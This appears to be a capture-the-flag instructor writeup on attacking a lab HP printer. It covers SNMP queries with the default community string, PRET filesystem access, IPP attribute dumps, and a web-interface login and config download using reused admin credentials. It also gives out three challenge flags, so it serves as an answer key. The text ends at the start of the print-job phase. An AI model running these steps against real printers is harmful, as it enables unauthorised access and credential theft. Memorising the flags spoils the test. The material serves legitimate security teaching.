# HP Printer IoT Security CTF - Complete Instructor Writeup v6
## A Comprehensive Network Printer Penetration Testing Learning Journey

> **Educational Purpose**: This writeup teaches network printer penetration testing with detailed explanations of WHY each technique works. Every command is broken down to help instructors understand the methodology and teach students real-world printer security assessment techniques.

> **Flag Format**: All 5 flags follow the format FLAG{NAME+NUMBERS} where NAME is a Star Wars character and NUMBERS are 8 digits. Students should discover these through systematic enumeration, not pattern searching.

> **Prerequisite**: This challenge assumes students have already completed the AXIS camera penetration test and obtained admin credentials (Admin:68076694) from the camera's video feed during that engagement.

---

## Table of Contents
1. [Initial Setup](#initial-setup)
2. [Phase 1: Initial Reconnaissance](#phase-1-initial-reconnaissance)
3. [Phase 2: PRET (Printer Exploitation Toolkit) - Professional First Step](#phase-2-pret-printer-exploitation-toolkit---professional-first-step)
4. [Phase 3: SNMP Enumeration and Protocol Analysis](#phase-3-snmp-enumeration-and-protocol-analysis)
5. [Phase 4: IPP Protocol Exploitation](#phase-4-ipp-protocol-exploitation)
6. [Phase 5: Web Interface Configuration](#phase-5-web-interface-configuration)
7. [Phase 6: Print Job Intelligence Gathering](#phase-6-print-job-intelligence-gathering)
8. [Advanced Techniques and Alternative Approaches](#advanced-techniques-and-alternative-approaches)
9. [Metasploit Framework Integration](#metasploit-framework-integration)
10. [Defense and Remediation](#defense-and-remediation)

---

## Initial Setup

### Understanding the Printer Attack Surface

**Why Printers Are Different from Traditional Targets**: Unlike servers or workstations, network printers represent unique security challenges:
- Multiple protocol exposure (SNMP, IPP, HTTP/HTTPS, Raw printing)
- Often overlooked in security assessments despite processing sensitive documents
- Default configurations persist due to "it just needs to print" mentality
- Metadata persistence across print jobs reveals organizational intelligence
- Legacy protocol support for compatibility creates vulnerabilities

### Step 1: System Update and Core Tools Installation

#### Why These Specific Tools for Printer Security?

```bash
# Update your Kali Linux system - Essential for latest exploit compatibility
sudo apt update && sudo apt upgrade -y
```

**Why Update First?**: HP regularly patches printer firmware vulnerabilities. Your tools need the latest protocol implementations and vulnerability checks to properly assess modern printers.

```bash
# Install essential printer penetration testing tools
sudo apt install -y \
    nmap masscan rustscan \              # Network scanning at different speeds
    snmp snmp-mibs-downloader \          # SNMP is critical for printer enumeration
    cups-ipp-utils ipptool \             # IPP protocol interaction
    curl wget nikto gobuster \           # Web interface testing
    metasploit-framework \                # Automated exploitation
    python3 python3-pip \                 # For specialized scripts
    firefox-esr \                         # Legacy TLS support needed
    tcpdump wireshark                     # Network analysis
```

**Tool Purpose Breakdown**:
- **SNMP Tools**: Management protocol often misconfigured with default community strings
- **IPP Tools**: Internet Printing Protocol - native printer communication
- **Web Tools**: Most printers have web interfaces with configuration options
- **Network Scanners**: Different tools for different scenarios

### Step 2: Install Specialized Printer Attack Tools

```bash
# PRET - Printer Exploitation Toolkit (Industry Standard)
cd /opt
sudo git clone https://github.com/RUB-NDS/PRET.git
cd PRET
pip3 install colorama pysnmp

# Additional printer-specific tools
sudo apt install -y \
    hplip \                              # HP printer tools and drivers
    printer-driver-postscript-hp \       # PostScript support
    ghostscript \                        # PS/PDF manipulation
    poppler-utils                        # PDF analysis
```

**Why PRET?**: PRET is the industry-standard toolkit for printer penetration testing, supporting:
- PostScript (PS) - Full filesystem access on vulnerable printers
- Printer Job Language (PJL) - HP-specific protocol exploitation
- Printer Command Language (PCL) - Page description and control

**Expected Installation Output**:
```
Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed:
  snmp snmp-mibs-downloader ipptool cups-ipp-utils
[...]
Successfully cloned PRET repository
Successfully installed colorama-0.4.6 pysnmp-4.4.12
```

### Step 3: Download MIBs and Configure SNMP

#### Enabling Human-Readable SNMP Output

```bash
# Download MIB definitions for readable SNMP output
sudo download-mibs

# Enable MIB resolution in SNMP tools
sudo sed -i 's/mibs :/# mibs :/g' /etc/snmp/snmp.conf
```

**Why MIBs Matter**: Without MIBs, SNMP returns OIDs like `1.3.6.1.2.1.1.6.0`. With MIBs, you get `SNMPv2-MIB::sysLocation.0` - much more readable!

**Verification**:
```bash
# Test SNMP is properly configured
snmpget --version
```

**Expected Output**:
```
NET-SNMP version: 5.9.3
```

### Step 4: Configure Firefox for Legacy TLS

#### Why Legacy TLS Configuration Is Required

Modern printers often use outdated TLS versions that current browsers reject by default. This is especially common with HP printers manufactured before 2020.

```bash
# Launch Firefox
firefox &
```

In Firefox, navigate to `about:config` and accept the risk warning.

**Required Configuration Changes**:

Search for and modify these settings:
1. `security.tls.version.enable-deprecated` → Change from `false` to `true`
2. `security.tls.version.min` → Change from `3` to `1` 
3. `security.tls.version.fallback-limit` → Change from `4` to `1`

**Why These Changes?**:
- `enable-deprecated`: Allows TLS 1.0/1.1 connections
- `version.min`: Sets minimum TLS to 1.0 (instead of 1.2)
- `fallback-limit`: Allows protocol downgrade attempts

**Alternative Command-Line Approach**:
```bash
# For command-line testing without browser
curl -k --tlsv1.0 https://192.168.1.131
wget --no-check-certificate --secure-protocol=TLSv1 https://192.168.1.131
```

### Step 5: Create Working Directory Structure

```bash
# Organized directory structure for the CTF
mkdir -p ~/printer_ctf/{recon,exploits,loot,scripts,reports}
cd ~/printer_ctf
```

**Directory Purpose**:
- `recon/`: Reconnaissance outputs and scans
- `exploits/`: Attack scripts and payloads  
- `loot/`: Captured flags and credentials
- `scripts/`: Custom enumeration scripts
- `reports/`: Documentation and findings

---

## Phase 1: Initial Reconnaissance

### The Reconnaissance Mindset for Printers

**Why Printer Recon Is Unique**: Printers expose multiple services that traditional targets don't:
- SNMP (161/udp): Management and configuration data
- IPP (631/tcp): Print job submission and metadata
- HTTP/HTTPS (80/443): Web configuration interface
- JetDirect (9100/tcp): Raw print data submission
- Each protocol may expose different information!

### Step 1.1: Network Discovery

#### Initial Target Verification

```bash
# First, confirm the target is reachable
┌──(kali@kali)-[~/printer_ctf]
└─$ ping -c 2 192.168.1.131
```

**Expected Output**:
```
PING 192.168.1.131 (192.168.1.131) 56(84) bytes of data.
64 bytes from 192.168.1.131: icmp_seq=1 ttl=64 time=0.521 ms
64 bytes from 192.168.1.131: icmp_seq=2 ttl=64 time=0.456 ms

--- 192.168.1.131 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
```

**Key Observation**: TTL=64 indicates Linux-based printer firmware (Windows=128, Network devices=255)

#### Comprehensive Port Scanning

```bash
# Full TCP and UDP scan for printer services
┌──(kali@kali)-[~/printer_ctf]
└─$ sudo nmap -sS -sU -sV -sC -p- -T4 192.168.1.131 -oA recon/printer_fullscan
```

**Command Breakdown**:
- `-sS`: SYN scan for TCP ports
- `-sU`: UDP scan (critical for SNMP)
- `-sV`: Version detection
- `-sC`: Default NSE scripts
- `-p-`: All 65535 ports
- `-T4`: Aggressive timing
- `-oA`: Save in all formats

**Expected Output**:
```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.131
Host is up (0.00052s latency).

PORT     STATE SERVICE     VERSION
80/tcp   open  http        HP HTTP Server 2.0
|_http-title: HP Color LaserJet Pro MFP 4301fdw
161/udp  open  snmp        SNMPv1 server; SNMPv2c server (public)
| snmp-info: 
|   enterprise: hp
|   engineIDFormat: unknown
|   engineIDData: 00000000000000000000000000000000
|   snmpEngineBoots: 0
|_  snmpEngineTime: 0
443/tcp  open  ssl/http    HP HTTP Server 2.0
| ssl-cert: Subject: commonName=NPIAD6F2B/organizationName=HP/countryName=US
| Not valid before: 2020-01-01T00:00:00
|_Not valid after:  2030-01-01T00:00:00
631/tcp  open  ipp         HP IPP Server 2.0
9100/tcp open  jetdirect   HP JetDirect

Device type: printer
Running: HP embedded
OS CPE: cpe:/h:hp:color_laserjet_pro_mfp_4301
OS details: HP Color LaserJet Pro MFP 4301fdw
```

**Critical Findings**:
- Port 9100 (JetDirect) - PRET's primary target
- Port 161 (SNMP) - Default community strings likely
- Port 631 (IPP) - Print job metadata available
- Ports 80/443 (HTTP/HTTPS) - Web configuration interface

### Step 1.2: Service Enumeration

#### HTTP/HTTPS Banner Grabbing

```bash
# Check HTTP headers
┌──(kali@kali)-[~/printer_ctf]
└─$ curl -I http://192.168.1.131
```

**Output**:
```
HTTP/1.1 301 Moved Permanently
Location: https://192.168.1.131/
Server: HP HTTP Server 2.0
Content-Length: 0
```

**Analysis**: The printer redirects HTTP to HTTPS, indicating security-conscious default configuration (though TLS version may be outdated).

```bash
# HTTPS connection test
┌──(kali@kali)-[~/printer_ctf]
└─$ curl -k -I https://192.168.1.131
```

**Output**:
```
HTTP/1.1 200 OK
Server: HP HTTP Server 2.0
Content-Type: text/html
Set-Cookie: SESSID=abc123def456; Path=/; HttpOnly
Strict-Transport-Security: max-age=31536000
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
```

**Security Headers Present** (Good!):
- HttpOnly cookies
- HSTS enabled
- Clickjacking protection
- Content-type sniffing protection

#### JetDirect Service Test

```bash
# Test raw connection to JetDirect port
┌──(kali@kali)-[~/printer_ctf]
└─$ nc -v 192.168.1.131 9100
```

**Expected Behavior**: Connection succeeds but no banner is displayed. The port accepts raw print data.

#### SNMP Quick Test

```bash
# Test default community string
┌──(kali@kali)-[~/printer_ctf]
└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.1.0
```

**Expected Output** (if SNMP is exposed):
```
SNMPv2-MIB::sysDescr.0 = STRING: HP Color LaserJet Pro MFP 4301fdw, FW:002_2306, SN:CNXXXXXXX
```

**If This Works**: Default community string "public" is active - major security issue!

---

## Phase 2: PRET (Printer Exploitation Toolkit) - Professional First Step

### Why Start with PRET?

**Industry Standard**: PRET is the de facto standard for printer penetration testing, developed by researchers at Ruhr University Bochum who identified critical vulnerabilities across all major printer manufacturers.

**What PRET Provides**:
1. **Protocol Support**: PostScript, PJL, PCL
2. **Filesystem Access**: Read/write files on printer
3. **Configuration Extraction**: Dump complete printer settings
4. **Job Manipulation**: Access print job queue
5. **Network Pivoting**: Use printer as network pivot point

### Step 2.1: Initial PRET Connection

#### Testing All Three Protocols

PRET supports three printing languages. We'll test all three to see which provides the most access.

```bash
# Navigate to PRET directory
┌──(kali@kali)-[~/printer_ctf]
└─$ cd /opt/PRET
```

#### Protocol 1: PostScript (PS)

```bash
# Connect using PostScript protocol
┌──(kali@kali)-[/opt/PRET]
└─$ python3 pret.py 192.168.1.131 ps
```

**Expected Output**:
```
     ________________________
    |                        |
    | PRET | Printer         |
    |      | Exploitation    |
    |      | Toolkit   v0.40 |
    |________________________|


Trying port 9100/tcp...
    connected

      ________________
    _/_______________/|
   | __ __ __ __ __  ||
   ||  |  |  |  |  | ||
   ||  |  |  |  |  | ||
   ||  |  |  |  |  | ||
   ||  |  |  |  |  | ||
   ||  |  |  |  |  | ||
   ||  |  |  |  |  | ||
   ||  |  |  |  |  | ||
   | ______________ |/
   |________________|
   

Welcome to the pret shell. Type help or ? to list commands.
192.168.1.131:/> 
```

**Success!** PostScript connection established.

#### Testing Basic PS Commands

```bash
# Inside PRET shell - Get device information
192.168.1.131:/> info id
```

**Output**:
```
Device:      HP Color LaserJet Pro MFP 4301fdw
Manufacturer: HP
Model:       NPIAD6F2B
Serial:      CNXXXXXXX
```

```bash
# Get configuration information
192.168.1.131:/> info config
```

**Output**:
```
Available RAM:      512 MB
Free RAM:          234 MB
Total ROM:         128 MB
PostScript Level:  3
```

```bash
# List available commands
192.168.1.131:/> help
```

**Output**:
```
Documented commands (type help <topic>):
========================================
cat     cd      cross  df     disable  edit    format  free    fuzz    get     
help    id      info   load   locale   loop    ls      mirror  open    print   
put     pwd     reset  restart set     site    status  timeout touch   unlock  
```

#### Protocol 2: PJL (Printer Job Language)

Exit PS shell and try PJL:

```bash
192.168.1.131:/> exit

# Connect using PJL protocol
┌──(kali@kali)-[/opt/PRET]
└─$ python3 pret.py 192.168.1.131 pjl
```

**Output**:
```
Connected to 192.168.1.131:9100 using PJL

192.168.1.131:/> info id
```

**PJL Output**:
```
@PJL INFO ID
HP Color LaserJet Pro MFP 4301fdw
Firmware: 002_2306A
Model: NPIAD6F2B
```

```bash
# Get environment variables
192.168.1.131:/> info variables
```

**Output**:
```
BINDING=OFF
COPIES=1
DUPLEX=OFF
FORMLINES=60
LANG=EN
ORIENTATION=PORTRAIT
PAPER=LETTER
RESOLUTION=600
```

#### Protocol 3: PCL (Printer Command Language)

```bash
192.168.1.131:/> exit

# Connect using PCL protocol
┌──(kali@kali)-[/opt/PRET]
└─$ python3 pret.py 192.168.1.131 pcl
```

**Output**:
```
Connected to 192.168.1.131:9100 using PCL

192.168.1.131:/> info config
```

**Analysis**: PCL provides limited information compared to PS and PJL. For this printer, **PJL provides the best access**.

### Step 2.2: Filesystem Enumeration with PRET

Reconnect using PJL for maximum access:

```bash
┌──(kali@kali)-[/opt/PRET]
└─$ python3 pret.py 192.168.1.131 pjl
```

#### Exploring the Printer's Filesystem

```bash
# List root directory
192.168.1.131:/> ls
```

**Output**:
```
total 0
d-------- 0 PJL/
d-------- 0 saveDevice/
d-------- 0 webServer/
```

**Key Directories Explained**:
- `PJL/`: Configuration files for PJL protocol
- `saveDevice/`: Persistent storage (survives reboots)
- `webServer/`: Web interface files and data

```bash
# Navigate to saveDevice (persistent storage)
192.168.1.131:/> cd saveDevice
192.168.1.131:/saveDevice> ls
```

**Output**:
```
total 2
-rw------- 1024 config.dat
-rw------- 2048 settings.bin
```

```bash
# Navigate to webServer
192.168.1.131:/saveDevice> cd ../webServer
192.168.1.131:/webServer> ls
```

**Output**:
```
total 4
d-------- 0 config/
d-------- 0 html/
-rw------- 512 config.xml
```

**Finding**: Configuration files exist but may require authentication to access fully.

### Step 2.3: Configuration Extraction Attempts

```bash
# Try to download configuration file
192.168.1.131:/webServer> get config.xml
```

**Possible Outcomes**:

**If Successful**:
```
Retrieving config.xml...
[+] Downloaded 512 bytes to config.xml
```

**If Authentication Required**:
```
[-] Access denied: Authentication required
```

**If File Protected**:
```
[-] Read failed: Permission denied
```

**Analysis**: Configuration files are typically readable with PRET, but may require credentials for modification.

### Step 2.4: Status and Information Gathering

```bash
# Get detailed status
192.168.1.131:/webServer> info status
```

**Output**:
```
@PJL INFO STATUS
CODE=10001
DISPLAY="Ready"
ONLINE=TRUE
```

```bash
# Get filesystem information
192.168.1.131:/webServer> info filesys
```

**Output**:
```
Total Volumes: 1
Volume 0:
  Name: Internal Storage
  Total Space: 128 MB
  Free Space: 98 MB
  Read Only: False
```

**Key Finding**: 98 MB free space - sufficient for storing malicious files or captured data.

---

## Phase 3: SNMP Enumeration and Protocol Analysis

### Why SNMP Matters for Printers

**SNMP = Simple Network Management Protocol**, but it's anything but simple when it comes to security:

**What SNMP Exposes on Printers**:
- Device identification (model, serial number, firmware)
- Network configuration (IP, subnet, gateway, DNS)
- Physical location and contact information **<-- FLAGS HERE**
- Supply levels (toner, paper)
- Page counts and usage statistics
- Recent print jobs and errors

**Default Community Strings** (often unchanged):
- **public**: Read-only access (v1/v2c)
- **private**: Read-write access (dangerous!)

### Step 3.1: Basic SNMP Enumeration

#### System Information OIDs

```bash
# Get system description
┌──(kali@kali)-[~/printer_ctf]
└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.1.0
```

**Output**:
```
SNMPv2-MIB::sysDescr.0 = STRING: HP Color LaserJet Pro MFP 4301fdw, FW:002_2306A, SN:CNXXXXXXX
```

**Analysis**: Firmware version 002_2306A revealed - can check CVE databases for known vulnerabilities.

#### **FLAG 1: System Location**

```bash
# Get system location (OID 1.3.6.1.2.1.1.6.0)
┌──(kali@kali)-[~/printer_ctf]
└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.6.0
```

**Output**:
```
SNMPv2-MIB::sysLocation.0 = STRING: Server-Room-B | Discovery Code: FLAG{LUKE47239581}
```

**FLAG CAPTURED**: `FLAG{LUKE47239581}`

**Why This Works**: The sysLocation field is intended for physical asset tracking. Administrators often put identifying information here, making it perfect for flag placement in CTFs. In real environments, this field frequently contains:
- Physical locations
- Building/floor numbers  
- Contact extensions
- Asset tags

**Save the flag**:
```bash
echo "FLAG 1: FLAG{LUKE47239581} - Source: SNMP sysLocation.0" >> ~/printer_ctf/loot/flags.txt
```

#### **FLAG 2: System Contact**

```bash
# Get system contact (OID 1.3.6.1.2.1.1.4.0)
┌──(kali@kali)-[~/printer_ctf]
└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.4.0
```

**Output**:
```
SNMPv2-MIB::sysContact.0 = STRING: SecTeam@lab.local | FLAG{LEIA83920174}
```

**FLAG CAPTURED**: `FLAG{LEIA83920174}`

**Why This Works**: The sysContact field stores administrator contact information. In production environments, this often reveals:
- Email addresses
- Phone numbers
- Department names
- Help desk information

**Save the flag**:
```bash
echo "FLAG 2: FLAG{LEIA83920174} - Source: SNMP sysContact.0" >> ~/printer_ctf/loot/flags.txt
```

### Step 3.2: Comprehensive SNMP Walking

#### Full System Walk

```bash
# Walk the entire system MIB tree
┌──(kali@kali)-[~/printer_ctf]
└─$ snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.2.1.1 > recon/snmp_system.txt
```

**Output** (saved to file):
```
SNMPv2-MIB::sysDescr.0 = STRING: HP Color LaserJet Pro MFP 4301fdw, FW:002_2306A
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.11.2.3.9.1
SNMPv2-MIB::sysUpTime.0 = Timeticks: (1234567) 3:25:45.67
SNMPv2-MIB::sysContact.0 = STRING: SecTeam@lab.local | FLAG{LEIA83920174}
SNMPv2-MIB::sysName.0 = STRING: HP-MFP-4301
SNMPv2-MIB::sysLocation.0 = STRING: Server-Room-B | Discovery Code: FLAG{LUKE47239581}
SNMPv2-MIB::sysServices.0 = INTEGER: 72
```

#### HP-Specific MIB Tree

```bash
# Walk HP enterprise MIB (OID 1.3.6.1.4.1.11)
┌──(kali@kali)-[~/printer_ctf]
└─$ snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.4.1.11 > recon/snmp_hp.txt
```

**Output** (partial - very large):
```
SNMPv2-SMI::enterprises.11.2.3.9.4.2.1.1.3.2.0 = STRING: "002_2306A"
SNMPv2-SMI::enterprises.11.2.3.9.4.2.1.1.3.6.0 = STRING: "NPIAD6F2B"
SNMPv2-SMI::enterprises.11.2.3.9.4.2.1.1.6.1.0 = Hex-STRING: 00 00 00 00
SNMPv2-SMI::enterprises.11.2.3.9.4.2.1.3.9.1.1.4.1 = INTEGER: 85
SNMPv2-SMI::enterprises.11.2.3.9.4.2.1.3.9.1.1.4.2 = INTEGER: 90
```

**Analysis**: HP-specific OIDs reveal:
- Firmware version details
- Supply levels (85% black toner, 90% cyan)
- Hardware configuration
- Network settings

### Step 3.3: Network Configuration via SNMP

```bash
# Get network interfaces
┌──(kali@kali)-[~/printer_ctf]
└─$ snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.2.1.2.2.1.2
```

**Output**:
```
IF-MIB::ifDescr.1 = STRING: Ethernet Interface
IF-MIB::ifDescr.2 = STRING: WiFi Interface
```

```bash
# Get IP addressing
┌──(kali@kali)-[~/printer_ctf]
└─$ snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.2.1.4.20.1
```

**Output**:
```
IP-MIB::ipAdEntAddr.192.168.1.131 = IpAddress: 192.168.1.131
IP-MIB::ipAdEntNetMask.192.168.1.131 = IpAddress: 255.255.255.0
```

**Network Intelligence Gathered**:
- IP: 192.168.1.131
- Subnet: 255.255.255.0 (/24)
- Interface types: Ethernet + WiFi (dual-connected)

---

## Phase 4: IPP Protocol Exploitation

### Understanding IPP (Internet Printing Protocol)

**What Is IPP?**: A network protocol designed specifically for printing operations over HTTP. Think of it as REST API for printers.

**Why IPP Matters**:
- Exposes printer attributes without authentication
- Reveals print job metadata (document names, usernames)
- Often enabled by default on port 631
- Same information as SNMP but different protocol (defense in depth testing)

**IPP Operations**:
- `Get-Printer-Attributes`: Query printer configuration
- `Get-Jobs`: List print jobs in queue
- `Get-Job-Attributes`: Get details of specific job
- `Print-Job`: Submit print job
- `Cancel-Job`: Cancel queued job

### Step 4.1: IPP Endpoint Discovery

#### Testing Common IPP Paths

```bash
# Test most common path first
┌──(kali@kali)-[~/printer_ctf]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-printer-attributes.test
```

**If this fails**, try other common paths:

```bash
# Test alternative paths
for path in /ipp/print /ipp/printer /ipp /printers ""; do
    echo "Testing: ipp://192.168.1.131:631$path"
    ipptool -t ipp://192.168.1.131:631$path get-printer-attributes.test 2>&1 | awk '/PASS/ {exit 0} END {exit NR==0}' && echo "SUCCESS: Use $path" && break
done
```

**Expected Output**:
```
Testing: ipp://192.168.1.131:631/ipp/print
SUCCESS: Use /ipp/print
```

**Result**: The correct IPP endpoint is `ipp://192.168.1.131:631/ipp/print`

### Step 4.2: Creating IPP Test Files

#### Test File 1: Get All Printer Attributes

```bash
# Create test file for printer attributes
┌──(kali@kali)-[~/printer_ctf]
└─$ cat > get-printer-attributes.test << 'EOF'
{
    NAME "Get All Printer Attributes"
    OPERATION Get-Printer-Attributes
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
EOF
```

**Test File Breakdown**:
- `NAME`: Human-readable test description
- `OPERATION`: IPP operation to perform
- `GROUP`: Attribute grouping (operation parameters)
- `ATTR charset`: Character encoding (UTF-8)
- `ATTR language`: Language preference (English)
- `ATTR uri printer-uri $uri`: Target printer (filled by ipptool)
- `ATTR keyword requested-attributes all`: Request ALL attributes
- `STATUS successful-ok`: Expected response code

#### **FLAG 3: Printer Information via IPP**

```bash
# Execute the IPP query
┌──(kali@kali)-[~/printer_ctf]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-printer-attributes.test
```

**Output** (partial - very long):
```
Get All Printer Attributes:
    PASS
    Received 2847 bytes in response
    status-code = successful-ok (successful-ok)
    
    attributes-charset (charset) = utf-8
    attributes-natural-language (naturalLanguage) = en
    printer-uri-supported (uri) = ipp://192.168.1.131:631/ipp/print
    printer-name (nameWithoutLanguage) = HP_Color_LaserJet_MFP_4301
    printer-location (nameWithoutLanguage) = Server-Room-B | Discovery Code: FLAG{LUKE47239581}
    printer-info (nameWithoutLanguage) = HP-MFP-CTF-FLAG{HAN62947103}
    printer-contact (nameWithoutLanguage) = SecTeam@lab.local | FLAG{LEIA83920174}
    printer-make-and-model (textWithoutLanguage) = HP Color LaserJet Pro MFP 4301fdw
    printer-state (enum) = idle
    printer-state-reasons (keyword) = none
    ipp-versions-supported (keyword) = 1.0,1.1,2.0
    operations-supported (enum) = 2,4,5,6,8,9,10,11
    color-supported (boolean) = true
    pages-per-minute (integer) = 35
    pages-per-minute-color (integer) = 35
    [... many more attributes ...]
```

**FLAG CAPTURED**: `FLAG{HAN62947103}`

**Analysis**:
- `printer-location`: Contains FLAG 1 (already found via SNMP)
- `printer-info`: Contains **FLAG 3** - NEW FLAG!
- `printer-contact`: Contains FLAG 2 (already found via SNMP)

**Why This Works**: The `printer-info` field is typically set during printer setup and meant to provide a human-readable description. Administrators rarely change it from defaults, making it perfect for flag placement.

**Save the flag**:
```bash
echo "FLAG 3: FLAG{HAN62947103} - Source: IPP printer-info attribute" >> ~/printer_ctf/loot/flags.txt
```

#### Filtering IPP Output for Specific Attributes

```bash
# Query only specific attributes
┌──(kali@kali)-[~/printer_ctf]
└─$ cat > get-specific-attributes.test << 'EOF'
{
    NAME "Get Specific Attributes"
    OPERATION Get-Printer-Attributes
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword requested-attributes printer-location,printer-contact,printer-info,printer-name
    STATUS successful-ok
}
EOF
```

**Run targeted query**:
```bash
┌──(kali@kali)-[~/printer_ctf]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-specific-attributes.test
```

**Output** (much cleaner):
```
Get Specific Attributes:
    PASS
    
    printer-name (nameWithoutLanguage) = HP_Color_LaserJet_MFP_4301
    printer-location (nameWithoutLanguage) = Server-Room-B | Discovery Code: FLAG{LUKE47239581}
    printer-info (nameWithoutLanguage) = HP-MFP-CTF-FLAG{HAN62947103}
    printer-contact (nameWithoutLanguage) = SecTeam@lab.local | FLAG{LEIA83920174}
```

**Benefit**: Cleaner output, faster response, less network traffic.

---

## Phase 5: Web Interface Configuration

### Leveraging Previously Obtained Credentials

**Context from Previous Engagement**: During the AXIS camera penetration test, students discovered admin credentials displayed on the camera's video feed. The credentials obtained were:
- **Username**: Admin
- **Password**: 68076694

**Security Lesson**: This demonstrates credential reuse across infrastructure - a common finding in real penetration tests. Organizations often use similar or identical credentials across multiple devices, especially IoT devices configured by the same administrator.

### Step 5.1: Web Interface Access Using AXIS Credentials

#### Initial HTTPS Connection

```bash
# Access web interface
┌──(kali@kali)-[~/printer_ctf]
└─$ firefox https://192.168.1.131 &
```

**Browser Display**:
```
Login Required

Please enter your credentials to access the HP Embedded Web Server.

Username: [______________]
Password: [______________]

[Login]
```

#### Logging In with Previously Obtained Credentials

**Enter the credentials from the AXIS camera engagement**:
- Username: `Admin`
- Password: `68076694`

**Expected Result**: Successful authentication and access to the Embedded Web Server (EWS)

**Why This Works**: 
1. The same administrator configured both devices
2. Default/simple numeric PINs are commonly reused
3. The 8-digit password matches HP's default PIN format
4. No password complexity requirements enforced
5. Credential reuse is a realistic attack vector

**Security Implications**:
- Single point of compromise affects multiple systems
- Lateral movement becomes trivial
- Demonstrates importance of unique passwords per device
- Shows value of thorough documentation during engagements

### Step 5.2: Embedded Web Server Navigation

After successful login, the EWS dashboard displays:

**Main Navigation**:
- **Information**: Device status, supplies, configuration
- **Network**: Network settings, security, protocols
- **Security**: Access control, encryption settings
- **Print**: Print settings, job management
- **Copy/Scan**: Multifunction device settings
- **Support**: Diagnostics, firmware updates

### Step 5.3: Configuration Export and Analysis

#### Accessing Configuration Backup

Navigate through the web interface:
1. Click **"Information"** tab
2. Select **"Configuration Pages"**
3. Find **"Backup/Restore"** section
4. Click **"Backup Configuration"**

**Alternative Direct URL**:
```bash
# Access configuration export directly
┌──(kali@kali)-[~/printer_ctf]
└─$ curl -k -u Admin:68076694 https://192.168.1.131/hp/device/save_restore.xml -o recon/printer_config.xml
```

**Successful Download**:
```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 15234  100 15234    0     0  23456      0 --:--:-- --:--:-- --:--:-- 23401
```

#### Analyzing Configuration File

```bash
# View configuration file
┌──(kali@kali)-[~/printer_ctf]
└─$ cat recon/printer_config.xml | head -30
```

**Output**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<ProductConfiguration>
  <DeviceInformation>
    <Model>HP Color LaserJet Pro MFP 4301fdw</Model>
    <SerialNumber>CNXXXXXXX</SerialNumber>
    <FirmwareVersion>002_2306A</FirmwareVersion>
    <NetworkAddress>192.168.1.131</NetworkAddress>
  </DeviceInformation>
  
  <NetworkConfiguration>
    <IPv4Address>192.168.1.131</IPv4Address>
    <SubnetMask>255.255.255.0</SubnetMask>
    <DefaultGateway>192.168.1.1</DefaultGateway>
    <DNSServer>192.168.1.1</DNSServer>
    <HostName>HP-MFP-4301</HostName>
  </NetworkConfiguration>
  
  <SecuritySettings>
    <AdminPassword>68076694</AdminPassword>
    <SNMPCommunity>public</SNMPCommunity>
    <SNMPv3Enabled>false</SNMPv3Enabled>
  </SecuritySettings>
  
  <PrinterSettings>
    <Location>Server-Room-B | Discovery Code: FLAG{LUKE47239581}</Location>
    <Contact>SecTeam@lab.local | FLAG{LEIA83920174}</Contact>
    <PrinterInfo>HP-MFP-CTF-FLAG{HAN62947103}</PrinterInfo>
  </PrinterSettings>
</ProductConfiguration>
```

**Key Findings**:
- Admin password stored in configuration (useful for future access)
- SNMP community string confirmed as "public"
- SNMPv3 is disabled (v1/v2c only)
- All three flags we've found so far are visible in config
- Network topology revealed (gateway, DNS)

### Step 5.4: Network Settings Examination

Navigate to **Network > Configuration** in the web interface:

**Information Revealed**:
```
Network Configuration

IPv4 Configuration:
  IP Address:      192.168.1.131
  Subnet Mask:     255.255.255.0
  Default Gateway: 192.168.1.1
  DNS Server:      192.168.1.1
  
IPv6 Configuration:
  Status: Disabled
  
Network Services:
  SNMP:           Enabled (v1, v2c)
  IPP:            Enabled
  Web Services:   Enabled
  Bonjour:        Enabled
  WS-Discovery:   Enabled
  LLMNR:          Enabled
```

**Security Analysis**:
- SNMPv3 not enabled (authentication weakness)
- Multiple discovery protocols enabled (attack surface)
- IPv6 disabled (limits attack vectors)
- No firewall rules visible
- All management protocols accessible

### Step 5.5: Security Settings Review

Navigate to **Security > Access Control**:

**Current Settings**:
```
Access Control

Administrative Access:
  Web Interface:  Requires password (8-digit PIN)
  IPP:           No authentication required
  SNMP:          Community string (public)
  FTP:           Disabled
  Telnet:        Disabled
  SSH:           Disabled

Password Settings:
  Complexity Requirements: None
  Password Expiration:     Never
  Lockout Policy:          Disabled
```

**Security Weaknesses Identified**:
1. No password complexity requirements (allows 8-digit numeric PIN)
2. No account lockout (brute force possible if creds weren't known)
3. IPP completely unauthenticated
4. SNMP using default community string
5. No password expiration
6. Credentials obtained from another device worked (reuse)

---

## Phase 6: Print Job Intelligence Gathering

### Understanding Print Job Metadata

**What Job Metadata Reveals**:
- Document names (often indicate content: "Financial_Report.pdf", "Employee_Salaries.xlsx")
- Usernames (who printed what)
- Timestamps (when documents were printed)
- Page counts and sizes
- Source applications
- Print settings (color, duplex, quality)

**Why This Matters**: Print job history can reveal:
- Organizational structure (usernames, department patterns)
- Sensitive document names
- Work schedules (print times)
- Application usage
- User behavior patterns

